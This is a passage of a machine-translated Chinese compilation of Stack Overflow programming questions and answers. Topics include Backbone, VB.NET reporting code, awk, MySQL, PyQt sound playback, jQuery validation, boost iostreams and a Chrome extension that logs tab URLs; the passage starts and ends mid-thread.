不，`SysListView32`在`explorer`主题中不会那样做。现代 Explorer 使用的控件实际上是`DirectUIHwnd`. 而且您无法使用其中之一。

获得行为的唯一方法`DirectUIHwnd`是自己编写代码。我希望这是可能的，但我也希望它很难实现。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-09-07T03:14:18.730

实际上有一种方法可以模仿 Explorer 的选择行为。它需要大量额外的声明性工作，但这是可能的。

您需要`IListView`通过未记录的消息获取未记录的接口`LVM_QUERYINTERFACE`（请注意，Windows Vista 和 Windows 7+ 的接口声明和 GUID 不同）。关于常量和声明的详细信息可以在这里找到：

*   [Geoff Chappell 的IListView](http://www.geoffchappell.com/studies/windows/shell/comctl32/controls/listview/interfaces/ilistview/index.htm?tx=25) - 软件分析师或
*   [代码项目中未记录的列表视图功能](http://www.codeproject.com/Articles/35197/Undocumented-List-View-Features)。

获取接口后，您只需调用`SetSelectionFlags(1, 1)`方法即可。瞧，你完成了。

# javascript - 从服务器的获取响应中排除时删除属性主干模型

> ID：15750843
> 
> 赞同：1
> 
> 时间：2013-04-01T20:01:47.117
> 
> 标签：javascript, backbone.js, underscore.js

我意识到这有点不标准，但我正在寻找一种方法，以便我可以使用 Backbone 的 fetch 方法来删​​除模型上未包含在服务器的 json 响应中的属性。基本上是排除属性的自动取消设置。

现在，我可以擦除所有内容并在模型上重新设置，但我想以一种不会触发剩余属性的更改事件的方式执行此操作。

我还希望不必遍历响应对象并调用`unset`. 我缺少 Backbone 的一个明显功能吗？

我为这种情况构建了一个小提琴。尝试让所有测试通过，同时只修改该`model.fetch()`行。

## [http://jsfiddle.net/gtSwC/](http://jsfiddle.net/gtSwC/)

```
var mockResponse = '{ "id": 1 }';
this.server.respondWith("GET", "/test", [ 
    200, 
    { "Content-Type": "application/json" },
    mockResponse
]);

var model = new MyModel({ foo: 'remove me', keep: true });
model.on('change:keep', function () {
    ok(false, 'Failure!  Do not trigger change on this if at all possible.');
});

// Act
model.fetch(); // Need a flag here?
this.server.respond();

// Assert
equal(model.get('foo'), undefined, 'I want this removed via fetch'); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T22:00:46.840

我刚刚看了看，似乎 Model#fetch 没有“重置”标志。不过，您可以使用静默标志取消设置。我猜 Backbone 自 0.9.10 以来的行为应该让你满意：

"*在更改上传递 {silent:true} 将不再延迟单个 "change:attr" 事件，而是完全静音。* "

# vb.net - 如何使用 VB.NET 函数返回整数列表？

> ID：15750846
> 
> 赞同：0
> 
> 时间：2013-04-01T20:01:52.440
> 
> 标签：vb.net, reporting-services, reportingservices-2005

我正在编写 SSRS2005 中的报告，我需要使用一些 VB.NET 代码来访问与报告中的数据库不同的数据库并返回整数列表（用户 ID）。我需要使用一些 VB.NET 代码来执行此操作。我有一些“有效”的代码，因为它不会引发任何错误并且我得到返回的值。但是，我只得到第一个值而不是整个列表。这是我到目前为止所拥有的：

```
Public Function GetUsers(ByVal param As Integer) As String
Dim sqlCon As New System.Data.SqlClient.SqlConnection 
Dim cmd As New System.Data.SqlClient.SqlCommand
Dim dRet As String
Dim sCmdText As String

sqlCon.ConnectionString = "data source=myServer;initial catalog=myDatabase;Integrated Security=true"

cmd = New System.Data.SqlClient.SqlCommand
sCmdText = "SELECT UsersRowID FROM dbo.tvf_Get_Users(" 
'cmd.CommandType = CommandType.Text
cmd.Connection = sqlCon
cmd.CommandTimeout = 0

sCmdText = sCmdText & param
sCmdText = sCmdText & ")"

cmd.CommandText = sCmdText
If sqlCon.State <> System.Data.ConnectionState.Open Then
sqlCon.Open()
End If
dRet = cmd.ExecuteScalar() & ""     
sqlCon.Close()

Return dRet

End Function 
```

我尝试过使用 DataSet 数据类型，但我收到错误消息，无法将 DataSet 转换为字符串。

有什么想法我需要做些什么才能让它发挥作用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:36:46.173

将您的代码修改为以下

```
Public Function GetUsers(ByVal param As Integer) As String
'
Dim sqlCon As New System.Data.SqlClient.SqlConnection
Dim cmd As New System.Data.SqlClient.SqlCommand
Dim dtAdapter As Data.SqlClient.SqlDataReader
Dim dRet As String
Dim sCmdText As String
'
  'connection
  sqlCon.ConnectionString = "data source=myServer;initial catalog=myDatabase;Integrated Security=true"
  sqlCon.Open()
  '
  'query
  sCmdText = "SELECT UsersRowID FROM dbo.tvf_Get_Users(" & param & ")"
  '
  'command
  cmd = New System.Data.SqlClient.SqlCommand(sCmdText, sqlCon)
  cmd.CommandTimeout = 0
  '
  'main course
  If cmd.Connection.State = Data.ConnectionState.Closed Then cmd.Connection.Open()
  dtAdapter = cmd.ExecuteReader(Data.CommandBehavior.CloseConnection)
  If dtAdapter.HasRows Then
    While dtAdapter.Read()
      ' following assumes "dbUserId" is the userid field in the database 
      ' also use pipe "|" to split the userid's whens theres more than one
      ' this is so you can still use STRING as the function return and not an ARRAY
      dRet = dRet & dtAdapter.GetValue(dtAdapter.GetOrdinal("dbUserId")) & "|"
    End While
  End If
  If cmd.Connection.State <> Data.ConnectionState.Closed Then cmd.Connection.Close()
  Return dRet
  '
End Function 
```

# google-apps-script - Google 电子表格脚本：调试图标已禁用

> ID：15750847
> 
> 赞同：16
> 
> 时间：2013-04-01T20:01:56.940
> 
> 标签：google-apps-script

这是我第一次尝试创建谷歌电子表格脚本。我正在关注本教程： [https ://developers.google.com/apps-script/articles/docslist_tutorial#section2](https://developers.google.com/apps-script/articles/docslist_tutorial#section2)

我无法加载 csv，我正在尝试调试。

我发现一个博客条目是这样说的：

> ...您可以在任何代码行上设置断点，只需单击行号。然后，只需使用“错误”工具栏图标而不是通常的“播放”按钮运行脚本，脚本将只运行到第一个断点。

但是，工具栏中的调试图标按钮是灰色的。

关于如何启用此功能的任何建议？谷歌搜索一无所获。我正在使用 Google Chrome 版本 26.0.1410.43。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-04-01T21:06:59.113

在下拉列表中选择一个函数

![在此处输入图像描述](https://i.stack.imgur.com/iiLo7.png)

# javascript - 如何在 YUIDoc 生成的文档上定义自定义主页

> ID：15750849
> 
> 赞同：6
> 
> 时间：2013-04-01T20:02:08.453
> 
> 标签：javascript, html, windows, yui, yuidoc

我一直在玩[YUIDoc](http://yui.github.com/yuidoc/)，我觉得它很棒。

顺便说一句，我找不到为自动生成的文档站点定义我自己的主页内容（自动生成的自定义内容`index.html`）的方法。

我如何定义主页内容——*当然，如果可能的话*——？

先感谢您！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-03T08:23:55.270

YUI Doc 非常具有主题性，所以理论上这应该很容易：

[Fork YUI Doc](https://github.com/yui/yuidoc)或修改您当前的 YUI Doc 安装。

*   下添加您自己的主题`yuidoc/themes`。复制默认主题可能是一个不错的起点，**或者**复制您想要覆盖的部分/文件。
*   在[`index.handlebars`](https://github.com/yui/yuidoc/blob/master/themes/default/partials/index.handlebars)您添加您的自定义内容。
*   您还可以更改[main.handlebars](https://github.com/yui/yuidoc/blob/master/themes/default/layouts/main.handlebars)以包含自定义 CSS、JS 和/或标记。

当您现在构建文档时，使用 --themedir 开关来使用您的新主题：

```
$ yuidoc --themedir ./mytheme 
```

**阅读更多**：[关于 YUI Doc 主题](http://yui.github.com/yuidoc/themes/index.html)。

# charts - 剑道图表缺少多个系列的 CategoryAxis 文本

> ID：15750852
> 
> 赞同：0
> 
> 时间：2013-04-01T20:02:10.217
> 
> 标签：charts, kendo-ui, axis-labels

我正在创建一个可以有多个数据集的剑道图表。

我正在创建一个 chartOptions 对象，该对象仅通过引用属性进行操作，而不是通过 Kendo 功能进行操作。这是通过以下代码完成的：

```
var chartOptions = {
        theme: "",
        seriesDefaults: {
            type: "line"
        },
        title: {
            text: ""
        },
        legend: {
            position: "bottom"
        },
        series: "",
        categoryAxis: {
            field: "category"
        }
    };

function createChart() {
        $("#chart").kendoChart(
            $.extend(true, {}, chartOptions)
        );
    } 
```

我还让用户定义他们想要的数据集。选择他们的数据集并创建他们的图表。然后呈现图表，但缺少其 categoryAxis 数据。

我正在通过以下方式设置系列数据（数据来自服务器，但例如可用）：

```
dataSetContents.Series = {"Series":[{"name":"2009 Data","data":[{"category":"2008","value":18159},{"category":"2007","value":315},{"category":"2009","value":8}]},{"name":"2008-2010","data":[{"category":"2010","value":750},{"category":"2009","value":2980},{"category":"2008","value":4135},{"category":"2007","value":55}]}]}

chartOptions.series = dataSetContents.Series; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T16:49:30.723

我弄清楚了我失去类别的原因。它与多个系列有关，通过设置 categoryAxis 来解决此问题的方法。这可以通过传递这样的类别数组来完成：

```
chartOptions.categoryAxis = { categories: [2007,2008,2009,2010] }; 
```

# java - 如何在 Java 中导航/处理原子入口链接？

> ID：15750853
> 
> 赞同：1
> 
> 时间：2013-04-01T20:02:10.800
> 
> 标签：java, parsing, atom-feed

我需要解析一个原子文档，其中条目链接指向其他相关条目。例如，一个条目包含有关电表的信息，而一个链接指向另一个条目，其中包含该电表的读数。确切的结构是：

[https://collaborate.nist.gov/twiki-sggrid/pub/SmartGrid/GreenButtonSDK/ESPISchemaOverview.png](https://collaborate.nist.gov/twiki-sggrid/pub/SmartGrid/GreenButtonSDK/ESPISchemaOverview.png)

谁能给我一个提示/起点？我知道 Java 中 XML 解析的基础知识，但使用链接在条目之间导航让我大吃一惊。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T12:25:03.153

[使用ROME](https://rometools.jira.com/wiki/display/ROME/Home)之类的东西来解析提要会给你提供作为[`Entry`](http://www.jarvana.com/jarvana/view/net/java/dev/rome/rome/1.0.0/rome-1.0.0-javadoc.jar!/com/sun/syndication/feed/atom/Entry.html)对象集合的提要。每个`Entry`都有一个 s 的集合[`Link`](http://www.jarvana.com/jarvana/view/net/java/dev/rome/rome/1.0.0/rome-1.0.0-javadoc.jar!/com/sun/syndication/feed/atom/Link.html)，包括可能的指向自身的链接 ( `rel='self'`) 以分配永久链接。

在条目之间导航很可能涉及遍历所有条目以找到目标，或者您可以构建自己的`Map`. 这不考虑由于链接而建立适当连接的逻辑，但它确实为您提供了标识符和链接方面的数据。

# ruby-on-rails - load_and_authorize_resource 与集合和自定义模型

> ID：15750854
> 
> 赞同：0
> 
> 时间：2013-04-01T20:02:10.803
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, controller, cancan

我有许多自定义操作的控制器：

```
class FooController < ApplicationController
  def fizz

  end

  def buzz

  end

  ...
end 
```

我想将 Bar 集合（不重复`@bars = Bar.all`）加载和授权到这两种方法中。

像这样的东西：

```
load_and_authorize_resource :bar, :collection, :only => [:fizz, :buzz, ...] 
```

但这根本行不通，`@bars`变量存在`nil`于所有动作中。请帮助我了解出了什么问题以及如何使其工作。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-16T21:30:48.890

以下对我有用（[来源](https://github.com/ryanb/cancan/issues/367)）：

```
load_and_authorize_resource :bar, :parent => false 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:06:56.903

您可以在控制器中使用 before_filter：

```
before_filter :load_and_authorize_resource, :only => [:fizz, :buzz]

private

def load_and_authorize_resource
   @bars = Bar.all
end 
```

# bash - 使用 awk 添加列

> ID：15750858
> 
> 赞同：0
> 
> 时间：2013-04-01T20:02:26.170
> 
> 标签：bash, shell, awk, command, add

我想在每一行的开头添加一个新列。使用的命令：

> 树 -afispugD --inode

我想添加一个新列，该列将作为文件名。

例子：

```
119801433 -rwxr--r-- u1915811 alum          1252 Apr  1 21:06  ./file
119802284 -rw-r--r-- u1915811 alum          1255 Mar 20 10:25  ./text.txt
119865862 drwxr-xr-x u1915811 alum          4096 Feb 27 10:20  ./S3/folder2 
```

对此：

```
file       119801433 -rwxr--r-- u1915811 alum          1252 Apr  1 21:06  ./file
text.txt   119802284 -rw-r--r-- u1915811 alum          1255 Mar 20 10:25  ./text.txt
folder2    119865862 drwxr-xr-x u1915811 alum          4096 Feb 27 10:20  ./S3/folder2 
```

PS：我必须这样做，因为`tree`命令不显示名称:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:33:55.263

所有你需要的是：

```
$ awk -F'/' '{print $NF,$0}' file
file 119801433 -rwxr--r-- u1915811 alum          1252 Apr  1 21:06  ./file
text.txt 119802284 -rw-r--r-- u1915811 alum          1255 Mar 20 10:25  ./text.txt
folder2 119865862 drwxr-xr-x u1915811 alum          4096 Feb 27 10:20  ./S3/folder2 
```

或者，如果您想在输出中使用某些特定间距，请使用 printf 而不是 print：

```
$ awk -F'/' '{printf "%-10s%s\n",$NF,$0}' file
file      119801433 -rwxr--r-- u1915811 alum          1252 Apr  1 21:06  ./file
text.txt  119802284 -rw-r--r-- u1915811 alum          1255 Mar 20 10:25  ./text.txt
folder2   119865862 drwxr-xr-x u1915811 alum          4096 Feb 27 10:20  ./S3/folder2 
```

或者，由于这是单行的简单替换，您可以使用 sed 代替 awk：

```
$ sed 's/\(.*\/\(.*\)\)/\2 \1/' file
file 119801433 -rwxr--r-- u1915811 alum          1252 Apr  1 21:06  ./file
text.txt 119802284 -rw-r--r-- u1915811 alum          1255 Mar 20 10:25  ./text.txt
folder2 119865862 drwxr-xr-x u1915811 alum          4096 Feb 27 10:20  ./S3/folder2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:16:19.623

如果文件的名称中有空格或者它是符号链接，这个也可以工作

```
tree -afispugD --inodes | awk '{FS="./"; ORS=""; printf("%-60s%s\n",$NF,$0)}' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T20:19:56.117

在文件名中有空格之前，这应该有效：

```
tree -afispugD --inodes | awk '{printf("-30s%s\n",$NF,$0}' 
```

# mysql - 进行查询以将所有内容从一个表复制到另一个表 ORDERING BY

> ID：15750863
> 
> 赞同：1
> 
> 时间：2013-04-01T20:02:41.607
> 
> 标签：mysql, sql, sql-order-by

我很好奇如何`table2`使用与 相同的数据创建相同的结构`table1`，但按列频率排序。

或者，这个问题的等价物是：正确更改表中行的id。

没关系，无论是通过 ASC 还是 DESC。

结果，`table1`：

```
**id - name - frequency**

    1 - John - 33
    2 - Paul - 127
    3 - Andy - 74 
```

应该变成`table2`：

```
**id - name - frequency**

    1 - Paul - 127
    2 - Andy - 74
    3 - John - 33 
```

最短的方法是什么？

此外，我会对大型表最快的查询感兴趣（尽管性能对我来说并不那么重要）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:04:13.867

像这样？

```
CREATE TABLE b SELECT col FROM a ORDER BY col 
```

请注意，[没有办法](https://stackoverflow.com/a/1949663/679449)保证数据库中的行顺序（除了物理上的）。您必须始终使用`ORDER BY`.

[参考](http://dev.mysql.com/doc/refman/5.5/en/create-table-select.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:09:26.487

为此，您需要创建新的 ID。这是一种 MySQL 方法：

```
create table table2 as
    select @rn := @rn + 1 as id, name, frequency
    from table1 cross join (select @rn := 0) const
    order by frequency desc 
```

# python - 使用 Pyqt4 和 QSound 播放声音

> ID：15750865
> 
> 赞同：0
> 
> 时间：2013-04-01T20:02:45.477
> 
> 标签：python, qt, audio, pyqt4

简而言之，经过数小时寻找在 pyqt4 中播放声音的方法后，我仍然无法弄清楚为什么这个简单的小代码不起作用？我没有收到任何错误消息或任何东西，但不是声音（我尝试过 mp3、ogg 和 wav），我只是得到一点 Windows“bing”声音，但不是我真正想要的声音文件。我知道有声子，但出于各种原因，我真的很想使用 QSound，也因为它应该更简单。如果你能给我任何提示为什么这不起作用或给出一个使用 QSound 的工作代码示例，我将非常感激。

```
import sys
from PyQt4 import QtGui, QtCore
from PyQt4.QtGui import QSound

class Example(QtGui.QMainWindow):

    def __init__(self):
        QtGui.QMainWindow.__init__(self)

        self.initUI()

    def initUI(self):

        self.setGeometry(300,300,200,200)

        self.b1 = QtGui.QPushButton("Play", self)
        self.b1.clicked.connect(self.Play)
        self.b1.move(50, 80)

    def Play(self):

        QSound.play("C:\directory\b1.mp3")

def main():
    app = QtGui.QApplication(sys.argv)
    ex = Example()
    ex.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T20:10:13.620

您可能会遇到两个不同的问题。

* * *

首先，如果您想使用 Windows 样式的路径名，您需要使用原始字符串或反斜杠转义。在常规字符串中，`\b`是单个退格字符，而不是 a`\`后跟 a `b`。换句话说，当您真正想要播放文件时，您正在尝试播放文件“C:\directory\x081.mp3” `C:\\directory\\b1.mp3`。有关详细信息，请参阅文档中的[字符串和字节文字](http://docs.python.org/3/reference/lexical_analysis.html#string-and-bytes-literals)。

您可以尝试记住所有特殊的反斜杠转义字符，但更简单的解决方案是始终转义所有反斜杠。或者，更简单的是，对所有 Windows 样式的路径名使用原始字符串。或者，更简单的是，如果您使用的函数即使在 Windows 上也允许使用 POSIX 样式的路径名，则只需使用它们即可。换句话说，以下之一：

```
"C:\directory\\b1.mp3"
"C:\\directory\\b1.mp3"
r"C:\directory\b1.mp3"
"C:/directory/b1.mp3" 
```

* * *

最重要的是，如果您使用的是旧版本的 PyQt，则不能以这种方式调用静态 Qt 方法。换句话说，您调用的不是`QSound::play(filename)`静态方法，而是`QSound::play()`实例（插槽）方法。在以后的版本中，这应该没问题——尽管，正如文档所说，构造 a`QSound`并调用它的`play`方法“可能……更直接地播放”，所以你可能还是想这样做。

如果您遇到此问题，解决方法是：

```
QSound(r"C:\directory\b1.mp3").play() 
```

尽管在实际代码中，您可能希望保留大部分`QSound`对象，而不是每次都重新创建它们。

* * *

在评论中，你说：

> 我发现 QSound 实际上不支持资源。不幸的是，我不知道这意味着什么，也许你可以解释一下这对我的代码意味着什么。

这对您的代码没有任何意义，至少今天没有。您已将声音保存在常规文件中，并且您正尝试通过绝对路径名访问这些文件。

但是如果你想在未来改进你的应用程序，它可能会成为阻碍。

资源在[Qt 资源系统](http://harmattan-dev.nokia.com/docs/library/html/qt4/resources.html)中进行了解释。这个想法是，您只需一个可执行文件（如 ），而不是拥有一堆单独的图像文件等文件`MyApp.exe`，所有资源文件都塞入该可执行文件中。在运行时，您仍然可以访问这些资源，就好像它们仍然是单独的文件一样。您只需使用特殊的路径，例如`:/sounds/b1.mp3`（或者，更好的是，从路径名切换到 URL，并使用特殊的 URL，例如`qrc:///sounds/b1.mp3`）。

踢球者是“几乎”。一些特性不能直接作用于资源，因此如果你想使用这些特性，你必须显式地将资源提取到一个临时文件中。

# c# - 当您捕获通用异常时，“异常被捕获”断点对话框窗口有一个额外的 '>' 字符？

> ID：15750867
> 
> 赞同：4
> 
> 时间：2013-04-01T20:02:55.883
> 
> 标签：c#, visual-studio-2010

我注意到来自 WCF 服务的错​​误异常有些奇怪，并且能够重新创建它：

创建一个新的控制台应用程序并添加以下类型：

```
class TestException<T> : Exception where T : IError, new() { }
interface IError { }
class NewError : IError { }
class NormalException : Exception { } 
```

在`Main`函数中，添加以下代码：

```
static void Main(string[] args)
{
    try
    {
        throw new NormalException();
    }
    catch (NormalException ne)
    { //break point here 
    }
    try
    {
        throw new TestException<NewError>();
    }
    catch (TestException<NewError> ge)
    {//break point here
    }
} 
```

当第一次捕获时中断命中时，窗口将显示如下：

![正常异常断点](https://i.stack.imgur.com/RXC5i.png)

当遇到通用异常时，您将看到以下窗口：

![通用异常断点](https://i.stack.imgur.com/2QDIL.png)

注意消息中的额外 > char。

这是正常的和预期的，还是我报告的？

任何人都可以尝试在 VS 2012 上复制它吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T18:33:31.843

我想这可能会或可能不会在即将发布的版本中得到解决：

> Microsoft 于 2013 年 4 月 3 日上午 11:29 发布 感谢您报告此问题。我们将考虑在未来的版本中解决此问题。谢谢，Visual Studio 调试器团队

# arrays - 如何在二维数组中使用 C 读取 jpeg 图像

> ID：15750870
> 
> 赞同：2
> 
> 时间：2013-04-01T20:03:02.977
> 
> 标签：arrays, image, jpeg, ocr

您好，我正在研究将图像转换为文本 [OCR] 的项目，但我的医生要求使用手动算法，所以我不能使用 opencv 或类似的东西，但任何建议对于 C 中的 OCR 也很有用！现在我正在尝试使用 C 语言读取 jpeg 并将该图像转换为 2D 数组，如下所示：

```
int A[10][10] ={
                {250,249,222,233,244,20,244,244,244,244},
                {250,249,222,233,19,20,244,244,244,244},
                {250,249,222,18,244,19,244,244,244,244},
                {250,249,222,233,244,17,244,244,244,244},
                {250,249,222,233,244,18,244,244,244,244},
                {250,249,222,233,244,10,244,244,244,244},
                {250,249,222,233,244,20,244,244,244,244},
                {250,249,222,233,244,19,244,244,244,244},
                {250,249,222,233,244,20,244,244,244,244},
                {250,249,222,233,244,18,244,244,244,244},
               }; 
```

但是 10x10 将取决于图像的高度和宽度我尝试了很多库 GDAL、Jpeglib ..etc 但没有任何效果我在上面的矩阵上完成了我的代码但现在它必须从桌面或任何目录加载图像并将其转换为上面的矩阵:)。

我真的很感激你能做的任何帮助:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-26T04:56:31.613

A. 你想把什么加载到数组中？

您的图像灰度是否只有一个组件？或者它是三组分颜色？彩色图像需要一个 3D 数组。

B. JPEG 的复杂性是这样的，除非你想花几个月的时间编写一个解码器，否则你将不得不让一个库以某种方式工作。您可能希望寻求帮助，让现有解码器与您的应用程序一起工作。

# javascript - 安卓视图+jquery

> ID：15750871
> 
> 赞同：3
> 
> 时间：2013-04-01T20:03:06.633
> 
> 标签：javascript, android, jquery, html, webview

我正在使用 webview GUI 开发一个 android 应用程序。我有一个包含页面的元素。它有一个页眉和一个页脚。

```
<div data-role="page">
  <div data-role="header">
    ...
  </div>
  <div data-role="content" id="bg_im">
    ...
  </div>
  <div data-role="footer">
    ...
  </div>
</div> 
```

我想插入一个图像作为内容 div 的背景，这样整个内容不会占用比可用屏幕尺寸更多的空间。

我有一个 javascript 可以做到这一点：

```
document.getElementById("bg_im").style.height=Math.floor($(window).height() - $('#home_header').height() - $('#home_footer').height() +"px"; 
```

该函数在页面加载时执行。

这一切在桌面浏览器（chrome，mozilla）中运行良好，但在android的webview中加载时失败。我发现原因是`.height()`页眉和页脚的函数返回值 0。

知道为什么吗？我尝试[了这个解决方案](https://stackoverflow.com/questions/15627973/jquery-header-height-returns-0-on-subsequent-pages)，但它也不起作用。它仍然返回页眉/页脚大小 0。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:22:37.967

您的主要问题可能来自您的 Math.floor() 方法。您正在混合字符串连接和算术运算。您应该将这些语句分开。

```
var newHeight = Math.floor($(window).height() - $('#home_header').height() - $('#home_footer').height()); 
$('#bg_img').prop('height', newHeight); 
```

# magento - Magento，将商品添加到购物篮，然后以访客身份结账或注册重定向回购物篮

> ID：15750874
> 
> 赞同：1
> 
> 时间：2013-04-01T20:03:15.777
> 
> 标签：magento, shopping-cart

这让我难倒了很长一段时间。我的网站 www.butterflywish.co.uk

每当我将任何物品添加到我的购物篮中，然后作为访客或注册结账时，它都会进入购买过程的下一页，然后几乎立即将我重定向回购物车页面。

我尝试过清理缓存、更改 php 内存大小以及其他帖子中的各种其他建议，但没有任何乐趣。

如果有人能够提供帮助，将不胜感激。

# jquery - 未调用 jQuery 表单验证

> ID：15750877
> 
> 赞同：0
> 
> 时间：2013-04-01T20:03:31.480
> 
> 标签：jquery, jquery-validate

我需要验证 HTML 表单中的姓名、房间号和电话号码字段。我为每个规则编写了自定义规则并在脚本中调用它们。但是当输入无效时，这些和默认的 jQuery 规则不会引发错误。这是我的代码。

```
<script>
$(document).ready(function() {

jQuery.validator.addMethod("firstlastname", function(value, element){
    return this.optional(element) || (/^[a-z]([-']?[a-z]+)*( [a-z]([-']?[a-z]+)*)+$/.test(value));
}, "Please Enter Your First and Last Name");

jQuery.validator.addMethod("roomnumber", function(value, element){
    return this.optional(element) || (/^\d{3}\S{0,1}/.test(value));
}, "Invalid Room Number");

jQuery.validator.addMethod("phonenumber", function(value, element){
    return this.optional(element) || (/^\d{3}\-\d{3}\-\d{4}$ | ^\d{10} | ^\(\d{3}\)\d{3}\-\d{4}$/.test(value));
}, "Invalid Phone Number Format");

  $("#my_form").validate({

    rules: {
      name: {
            required: true,
            firstlastname: true
      },

      room_number: { 
            roomnumber: true
      },
      cell_phone: {
          required: true,
          phonenumber: true
      }
    },

    messages: {
        name: {
            required: "First and Last Name is Required",
            firstlastname: "Please Enter Your First and Last Name"
        },
        room_number: {
            roomnumber: "Invalid Room Number"
        },
        cell_phone: {
            required: "Phone Number is Required",
            phonenumber: "Please Enter a Valid Phone Number"
        }
    },

    errorPlacement: function(error, element) {
        if (element.attr("name") == "Name") {
            error.appendTo($("#nameValid"));
        } else if (element.attr("name") == "Room_Number") {
            error.appendTo($("#roomNumberValid"));
        } else if (element.attr("name") == "Cell_Phone") {
            error.appendTo($("#cellPhoneValid"));

        }
    } 
});
});

</script> 
```

这是HTML

```
<form id="my_form" method="post" >
<p>Name:    </p>
<p>
  <input name="name" style="width: 275px" type="text"/>
  <span id="nameValid"></span>
</p>

<p>Room Number:</p>
<p>
  <input name="room_number" type="text" maxlength="5"/>
  <span id="roomNumberValid"></span>
</p>

<p>Cell Phone:</p>
  <p> <input name="cell_phone" style="width: 192px" type="text" maxlength="13"/> <br/>
<span id="cellPhoneValid"></span>
  </p> 
```

我已经尝试过不同的 jquery 文件和 jquery validate 插件版本，它们都允许我提交无效输入。我在这里先向您的帮助表示感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:01:19.350

根本问题是`errorPlacement`函数中的语法问题。与大多数 JavaScript 和 HTML 一样，该`name`属性区分大小写。

`if (element.attr("name") == "Room_Number")``name`实际上是永远不会工作的`"room_number"`。

试试这个：

```
errorPlacement: function (error, element) {
    if (element.attr("name") == "name") {
        error.appendTo($("#nameValid"));
    } else if (element.attr("name") == "room_number") {
        error.appendTo($("#roomNumberValid"));
    } else if (element.attr("name") == "cell_phone") {
        error.appendTo($("#cellPhoneValid"));
    }
} 
```

**工作：http: [//jsfiddle.net/8KVHv/](http://jsfiddle.net/8KVHv/)**

虽然，我不太确定为什么你有一个非常冗长的自定义`errorPlacement`回调，当它看起来与默认的功能完全相同时：http: [//jsfiddle.net/8KVHv/2/](http://jsfiddle.net/8KVHv/2/)

如果您希望将错误文本放在 a而不是默认元素中，则可以使用[该`wrapper: "span"`选项。](http://docs.jquery.com/Plugins/Validation/validate#toptions)见：http: [//jsfiddle.net/8KVHv/3/](http://jsfiddle.net/8KVHv/3/)`span``label`

* * *

**顺便说一句**：您可能不需要为电话号码编写自定义方法。也许只是使用文件中的`phoneUS`规则[`additional-methods.js`](http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/additional-methods.js)。

**见：http: [//jsfiddle.net/8KVHv/1/](http://jsfiddle.net/8KVHv/1/)**

# c++ - 使用 boost::iostreams 时崩溃

> ID：15750878
> 
> 赞同：1
> 
> 时间：2013-04-01T20:03:31.827
> 
> 标签：c++, boost, gzip, boost-iostreams, compression

我正在尝试使用 boost::iostreams(1.53.0) 解压缩 HTTP 请求正文并稍后处理它。但是当我运行以下代码时，我遇到了崩溃。

```
try {
    using namespace boost::iostreams;
    ifstream file(argv[1], std::ios_base::in | std::ios_base::binary);
    boost::iostreams::filtering_istream in;
    in.push(gzip_decompressor());
    in.push(file);
    std::stringstream strstream;
    boost::iostreams::copy(in, strstream);
} catch (std::exception& e) {
    cout << e.what() << endl;
} 
```

崩溃发生在 中`gzip_decompressor()`，更具体地说，发生在`gzip_header() { reset(); }`boost 的 gzip.hpp 中（通过查看调用堆栈）。

我自己编译了 boost::iostreams 库，还尝试使用 macports 的 boost，但发生了同样的崩溃。我也尝试过使用[gzstream 库](http://www.cs.unc.edu/Research/compgeom/gzstream/)，但是在构造函数中也会崩溃，更具体地说是在`igzstream`.

我倾向于认为这是一个与 zlib 相关的问题。我没有具体说明，我使用的是带有 Mountain Lion 和 xCode 4.6 的 MacBook Pro 来构建和运行代码。

你们之前有没有遇到过这样的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:03:50.700

我发现了问题：Apple 的 LLVM 编译器。我确定我使用的是 GCC，但似乎不是。

我偶然发现了另一个奇怪的崩溃，这只是通过实例化一个`std::string`对象而发生的。这让我检查了项目设置，发现我正在使用 LLVM 编译器，这可能对我链接 gcc 构建的库不满意。

感谢您的回复。

# google-chrome-extension - 在 Chrome 扩展中获取标签标题

> ID：15750889
> 
> 赞同：2
> 
> 时间：2013-04-01T20:04:01.137
> 
> 标签：google-chrome-extension

前言，我在这里是一个极端的新手。

我正在做一个扩展来记录访问网站的 URL 和标签标题。我下面的代码给了我除了标签标题之外的所有东西，我得到“未定义”。我不确定如何获取标签标题：

```
chrome.webRequest.onCompleted.addListener(
function(info) {
var req = new XMLHttpRequest();
req.open("POST", "https://docs.google.com/spreadsheet/formResponse?formkey=FORMKEY", true);
var params = "entry.0.single=" + info.url + "&entry.1.single=" + info.tabid; 
req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
req.send(params);
} ,{ urls: ["<all_urls>"], types: ["main_frame"]}
); 
```

我看到的输出是：

```
4/1/2013 12:53:35   http://www.url.com/ undefined 
```

有人告诉我我在获取标签标题时做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T23:26:15.463

我在您的代码中看不到您将获得该标题的任何地方。`info`不包含该数据，而是包含`tabId`您拼写错误的数据（未定义的来源）。您可以使用它`info.tabId`来获取选项卡并使用该选项卡对象来获取标题，如下所示：

```
chrome.webRequest.onCompleted.addListener(function(info) {
  var req = new XMLHttpRequest();
